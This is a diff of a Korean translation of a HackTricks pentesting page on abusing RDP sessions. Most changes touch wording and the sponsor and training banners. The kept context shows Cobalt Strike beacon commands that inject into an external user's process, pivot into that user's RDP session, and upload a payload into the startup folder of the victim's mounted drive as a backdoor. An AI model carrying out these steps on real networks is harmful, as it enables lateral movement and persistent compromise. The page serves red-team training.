@@ -1,24 +1,25 @@
 # RDP 세션 남용
 
+{% hint style="success" %}
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
-* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기교를 공유**하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
+{% endhint %}
 
-## RDP 프로세스 삽입
+## RDP 프로세스 주입
 
-**외부 그룹**이 현재 도메인의 **컴퓨터** 중 **어떤 컴퓨터에 RDP 액세스**를 가지고 있다면, **공격자**는 **해당 컴퓨터를 침해**하고 기다릴 수 있습니다.
+**외부 그룹**이 현재 도메인의 **어떤 컴퓨터**에 **RDP 접근** 권한이 있다면, **공격자**는 **해당 컴퓨터를 손상시키고 그를 기다릴 수 있습니다**.
 
-한 번 사용자가 RDP를 통해 접속한 후, **공격자는 해당 사용자의 세션으로 피벗**하여 외부 도메인에서 권한을 남용할 수 있습니다.
+해당 사용자가 RDP를 통해 접근하면, **공격자는 그 사용자의 세션으로 피벗할 수 있으며** 외부 도메인에서 그 권한을 남용할 수 있습니다.
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -42,13 +43,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-**다른 도구를 사용하여 세션을 도용하는 다른 방법**은 [**이 페이지에서 확인하세요.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-**공격자**가 **기다리는** **기계**로 **RDP를 통해 사용자**가 액세스하면, 공격자는 **사용자의 RDP 세션에 비콘을 삽입**할 수 있으며, **피해자가 RDP를 통해 드라이브를 마운트**했을 경우, **공격자는 이에 접근**할 수 있습니다.
+사용자가 **RDP를 통해 머신에 접근**할 때, **공격자**가 그를 **기다리고** 있다면, 공격자는 **사용자의 RDP 세션에 비콘을 주입**할 수 있으며, 만약 **희생자가 RDP를 통해 접근할 때 드라이브를 마운트**했다면, **공격자는 그것에 접근할 수 있습니다**.
 
-이 경우, **시작 폴더**에 **백도어를 작성**하여 **피해자의 원래 컴퓨터**를 **침해**할 수 있습니다.
+이 경우, **희생자의** **원래 컴퓨터**를 **백도어**를 **시작 폴더**에 작성하여 **타락**시킬 수 있습니다.
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -80,16 +81,17 @@ dir     10/18/2016 01:59:39   Documents and Settings
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
+{% hint style="success" %}
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 배워보세요<strong>!</strong></summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
-* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
+{% endhint %}
